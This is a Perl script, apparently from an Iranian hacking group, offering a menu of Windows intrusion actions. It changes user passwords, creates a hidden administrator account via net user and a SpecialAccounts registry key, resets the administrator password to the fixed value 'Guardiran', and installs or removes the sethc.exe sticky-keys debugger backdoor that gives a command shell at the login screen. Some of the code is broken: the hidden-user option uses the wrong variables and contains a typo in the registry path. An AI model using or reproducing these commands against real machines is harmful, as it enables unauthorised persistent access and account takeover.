#!/usr/bin/perl
#VPS Tools
#Tools : Change Password , Create Hidden User , Set Password Default = Guardiran , Create Backdoor , Delete Backdoor
#Coded By : dr-iman ( Guardiran Security Team )

use Term::ANSIColor;

use LWP::UserAgent;



system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print colored ("       >> Coded By dr-iman ( Guardiran Security Team 'Guardiran.org' ) << ",'bold red'),"\n";

print qq(

 __   __  _______  _______    _______  _______  _______  ___      _______ 
|  | |  ||       ||       |  |       ||       ||       ||   |    |       |
|  |_|  ||    _  ||  _____|  |_     _||   _   ||   _   ||   |    |  _____|
|       ||   |_| || |_____     |   |  |  | |  ||  | |  ||   |    | |_____ 
|       ||    ___||_____  |    |   |  |  |_|  ||  |_|  ||   |___ |_____  |
 |     | |   |     _____| |    |   |  |       ||       ||       | _____| |
  |___|  |___|    |_______|    |___|  |_______||_______||_______||_______|

);

print "\nChoose Method : 1-Change Password , 2-Creat Hidden User , 3-Set Password Default = Guardiran
\n                4-Creat Backdoor , 5-Delete Backdoor\n";

$choice1=<STDIN>;
chomp ($choice1);
if ($choice1 eq "1" or $choice1 eq "Change Password")
{
print " Enter Username :";
$user=<STDIN>;

print " Enter Password :";
$password=<STDIN>;

system ("net user $user $password");
}

elsif ($choice1 eq "2" or $choice1 eq "Creat Hidden User")
{
print "Enter Username :";
$user2=<STDIN>;
chomp($user2);

print "Enter Password :";
$password2=<STDIN>;
chomp ($password2);

system ("net user $user $password ");
system ("net localgroup administrators /add $user");
system ('reg add "hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlis t" /v username /t reg_dword /d 0 /f ');
}

elsif ($choice1 eq "3" or $choice1 eq "Set Password Default" )
{
system ("net user administrator Guardiran");
}

elsif ($choice1 eq "4" or $choice1 eq "Creat Backdoor" )
{
system ('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"');
}

elsif ($choice1 eq "5" or $choice1 eq "Delete Backdoor")
{
system ('REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" ');
}